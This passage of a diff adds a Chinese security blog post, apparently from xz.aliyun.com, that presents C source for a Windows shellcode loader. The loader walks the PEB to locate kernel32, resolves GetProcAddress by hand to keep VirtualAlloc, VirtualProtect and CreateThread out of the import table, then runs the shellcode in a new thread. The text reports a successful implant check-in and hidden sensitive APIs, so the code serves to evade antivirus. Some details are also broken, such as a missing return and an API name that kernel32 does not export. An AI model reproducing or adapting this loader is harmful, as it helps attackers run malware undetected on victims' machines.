+ <span class="n">DWORD</span> <span class="n">dwKernel32Addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+ <span class="n">_asm</span> <span class="p">{</span>
+     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="nl">fs</span><span class="p">:</span> <span class="p">[</span><span class="mh">0x30</span><span class="p">]</span>
+             <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0x0c</span><span class="p">]</span>
+             <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">]</span>
+             <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+             <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+             <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">]</span>
+             <span class="n">mov</span> <span class="n">dwKernel32Addr</span><span class="p">,</span> <span class="n">eax</span>
+ <span class="p">}</span>
+ <span class="k">return</span>  <span class="n">dwKernel32Addr</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">DWORD</span> <span class="nf">RGetProcAddress</span><span class="p">()</span> <span class="p">{</span>
+ <span class="c1">//获取kernel32的地址</span>
+ <span class="n">DWORD</span> <span class="n">dwAddrBase</span> <span class="o">=</span> <span class="n">GetKernel32Address</span><span class="p">();</span>
+ <span class="c1">//获取Dos头</span>
+ <span class="n">PIMAGE_DOS_HEADER</span> <span class="n">pDos</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">dwAddrBase</span><span class="p">;</span>
+ <span class="c1">//获取Nt头</span>
+ <span class="n">PIMAGE_NT_HEADERS</span> <span class="n">pNt</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)(</span><span class="n">pDos</span><span class="o">-&gt;</span><span class="n">e_lfanew</span> <span class="o">+</span> <span class="n">dwAddrBase</span><span class="p">);</span>
+ <span class="c1">//数据目录表                         扩展头 数据目录表 + 导出表    定位导出表</span>
+ <span class="n">PIMAGE_DATA_DIRECTORY</span> <span class="n">pDataDir</span> <span class="o">=</span> <span class="n">pNt</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span> <span class="o">+</span> <span class="n">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="p">;</span>
+ <span class="c1">//导出表</span>
+ <span class="c1">//导出表地址</span>
+ <span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="n">pExport</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span><span class="p">)(</span><span class="n">dwAddrBase</span> <span class="o">+</span> <span class="n">pDataDir</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">);</span>
+ <span class="c1">//函数总数</span>
+ <span class="n">DWORD</span> <span class="n">dwFunCount</span> <span class="o">=</span> <span class="n">pExport</span><span class="o">-&gt;</span><span class="n">NumberOfFunctions</span><span class="p">;</span>
+ <span class="c1">//函数名称数量</span>
+ <span class="n">DWORD</span> <span class="n">dwFunNameCount</span> <span class="o">=</span> <span class="n">pExport</span><span class="o">-&gt;</span><span class="n">NumberOfNames</span><span class="p">;</span>
+ <span class="c1">//函数地址</span>
+ <span class="n">PDWORD</span> <span class="n">pAddrOfFun</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">pExport</span><span class="o">-&gt;</span><span class="n">AddressOfFunctions</span> <span class="o">+</span> <span class="n">dwAddrBase</span><span class="p">);</span>
+ <span class="c1">//函数名称地址</span>
+ <span class="n">PDWORD</span> <span class="n">pAddrOfNames</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">pExport</span><span class="o">-&gt;</span><span class="n">AddressOfNames</span> <span class="o">+</span> <span class="n">dwAddrBase</span><span class="p">);</span>
+ <span class="c1">//序号表</span>
+ <span class="n">PWORD</span> <span class="n">pAddrOfOrdinals</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWORD</span><span class="p">)(</span><span class="n">pExport</span><span class="o">-&gt;</span><span class="n">AddressOfNameOrdinals</span> <span class="o">+</span> <span class="n">dwAddrBase</span><span class="p">);</span>
+ <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dwFunCount</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pAddrOfFun</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="p">{</span>
+         <span class="k">continue</span><span class="p">;</span>
+     <span class="p">}</span>
+     <span class="n">DWORD</span> <span class="n">dwFunAddrOffset</span> <span class="o">=</span> <span class="n">pAddrOfFun</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+     <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">dwFunNameCount</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+         <span class="k">if</span> <span class="p">(</span><span class="n">pAddrOfOrdinals</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+             <span class="n">DWORD</span> <span class="n">dwNameOffset</span> <span class="o">=</span> <span class="n">pAddrOfNames</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+             <span class="kt">char</span> <span class="o">*</span> <span class="n">pFunName</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">dwAddrBase</span> <span class="o">+</span> <span class="n">dwNameOffset</span><span class="p">);</span>
+             <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">pFunName</span><span class="p">,</span> <span class="s">"GetProcAddress"</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                 <span class="k">return</span> <span class="n">dwFunAddrOffset</span> <span class="o">+</span> <span class="n">dwAddrBase</span><span class="p">;</span>
+             <span class="p">}</span>
+         <span class="p">}</span>
+     <span class="p">}</span>
+ <span class="p">}</span>
+<span class="p">}</span>
+<span class="c1">//自定义API</span>
+<span class="c1">//获取kernel32.dll地址</span>
+<span class="n">HMODULE</span> <span class="n">hKernel32</span> <span class="o">=</span> <span class="p">(</span><span class="n">HMODULE</span><span class="p">)</span><span class="n">GetKernel32Address</span><span class="p">();</span>
+<span class="c1">//自定义GetProcAddress</span>
+<span class="k">typedef</span> <span class="nf">FARPROC</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">pGetProcAddress</span><span class="p">)(</span>
+ <span class="n">_In_</span> <span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>
+ <span class="n">_In_</span> <span class="n">LPCSTR</span> <span class="n">lpProcName</span>
+ <span class="p">);</span>
+<span class="c1">//动态获取GetProcAddress</span>
+<span class="n">pGetProcAddress</span> <span class="n">MyGetProcAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">pGetProcAddress</span><span class="p">)</span><span class="n">RGetProcAddress</span><span class="p">();</span>
+<span class="c1">//自定义GetModuleHandle</span>
+<span class="k">typedef</span> <span class="nf">HMODULE</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">pGetModuleHandle</span><span class="p">)(</span>
+ <span class="n">_In_</span> <span class="n">LPCSTR</span> <span class="n">lpLibFileName</span>
+ <span class="p">);</span>
+<span class="n">pGetModuleHandle</span> <span class="n">MyGetModuleHandle</span> <span class="o">=</span> <span class="p">(</span><span class="n">pGetModuleHandle</span><span class="p">)</span><span class="n">MyGetProcAddress</span><span class="p">(</span><span class="n">hKernel32</span><span class="p">,</span> <span class="s">"GetModuleHandle"</span><span class="p">);</span>
+<span class="c1">//自定义VirtualProtect</span>
+<span class="k">typedef</span> <span class="nf">BOOL</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pVirtualProtect</span><span class="p">)</span> <span class="p">(</span>
+ <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
+ <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
+ <span class="n">DWORD</span>  <span class="n">flNewProtect</span><span class="p">,</span>
+ <span class="n">PDWORD</span> <span class="n">lpflOldProtect</span>
+<span class="p">);</span>
+<span class="n">pVirtualProtect</span> <span class="n">MyVirtualProtect</span> <span class="o">=</span> <span class="p">(</span><span class="n">pVirtualProtect</span><span class="p">)</span><span class="n">MyGetProcAddress</span><span class="p">(</span><span class="n">hKernel32</span><span class="p">,</span> <span class="s">"VirtualProtect"</span><span class="p">);</span>
+<span class="c1">//自定义CreateThread</span>
+<span class="k">typedef</span> <span class="nf">HANDLE</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pCreateThread</span><span class="p">)(</span>
+ <span class="n">LPSECURITY_ATTRIBUTES</span>   <span class="n">lpThreadAttributes</span><span class="p">,</span>
+ <span class="n">SIZE_T</span>                  <span class="n">dwStackSize</span><span class="p">,</span>
+ <span class="n">LPTHREAD_START_ROUTINE</span>  <span class="n">lpStartAddress</span><span class="p">,</span>
+ <span class="n">__drv_aliasesMem</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
+ <span class="n">DWORD</span>                   <span class="n">dwCreationFlags</span><span class="p">,</span>
+ <span class="n">LPDWORD</span>                 <span class="n">lpThreadId</span>  
+<span class="p">);</span>
+<span class="n">pCreateThread</span> <span class="n">MyCreateThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">pCreateThread</span><span class="p">)</span><span class="n">MyGetProcAddress</span><span class="p">(</span><span class="n">hKernel32</span><span class="p">,</span><span class="s">"CreateThread"</span><span class="p">);</span>
+<span class="c1">//自定义VirtualAlloc</span>
+<span class="k">typedef</span> <span class="nf">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">pVirtualAlloc</span><span class="p">)(</span>
+ <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
+ <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
+ <span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
+ <span class="n">DWORD</span>  <span class="n">flProtect</span>
+<span class="p">);</span>
+<span class="n">pVirtualAlloc</span> <span class="n">MyVirtualAlloc</span> <span class="o">=</span> <span class="p">(</span><span class="n">pVirtualAlloc</span><span class="p">)</span><span class="n">MyGetProcAddress</span><span class="p">(</span><span class="n">hKernel32</span><span class="p">,</span> <span class="s">"VirtualAlloc"</span><span class="p">);</span>
+<span class="c1">// 入口函数</span>
+<span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+ <span class="kt">int</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+ <span class="c1">// shellcode长度</span>
+ <span class="n">DWORD</span> <span class="n">dwThreadId</span><span class="p">;</span>
+ <span class="c1">// 线程ID</span>
+ <span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span>
+ <span class="c1">// 线程句柄</span>
+ <span class="n">DWORD</span> <span class="n">dwOldProtect</span><span class="p">;</span>
+ <span class="c1">// 内存页属性</span>
+ <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
+ <span class="c1">// 获取shellcode大小</span>
+ <span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+ <span class="kt">char</span> <span class="o">*</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">MyVirtualAlloc</span><span class="p">(</span>
+         <span class="nb">NULL</span><span class="p">,</span>
+         <span class="n">shellcode_size</span><span class="p">,</span>
+         <span class="n">MEM_COMMIT</span><span class="p">,</span>
+         <span class="n">PAGE_READWRITE</span> <span class="c1">// 只申请可读可写</span>
+ <span class="p">);</span>
+ <span class="c1">// 将shellcode复制到可读可写的内存页中</span>
+ <span class="n">CopyMemory</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>
+ <span class="c1">// 这里开始更改它的属性为可执行</span>
+ <span class="n">MyVirtualProtect</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">PAGE_EXECUTE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtect</span><span class="p">);</span>
+ <span class="n">hThread</span> <span class="o">=</span> <span class="n">MyCreateThread</span><span class="p">(</span>
+         <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 安全描述符</span>
+ <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 栈的大小</span>
+ <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcode</span><span class="p">,</span> <span class="c1">// 函数</span>
+ <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 参数</span>
+ <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 线程标志</span>
+ <span class="o">&amp;</span><span class="n">dwThreadId</span> <span class="c1">// 线程ID</span>
+ <span class="p">);</span>
+ <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
+ <span class="c1">// 一直等待线程执行结束</span>
+ <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+成功上线：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230113142006-526b7f86-930a-1.png"/><br/>
+查看导入表，敏感API都已隐藏：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230113142016-58e2ab0a-930a-1.png"/><br/>
+## 参考链接<br/>
+<a href="https://xz.aliyun.com/t/10478" target="_blank">https://xz.aliyun.com/t/10478</a><br/>
+<a href="https://bbs.kanxue.com/thread-266678.htm" target="_blank">https://bbs.kanxue.com/thread-266678.htm</a><br/>
+<a href="https://www.bilibili.com/video/BV1re4y1j7ih/" target="_blank">https://www.bilibili.com/video/BV1re4y1j7ih/</a>
+</li>
+</ol>
+</div>
+</div>
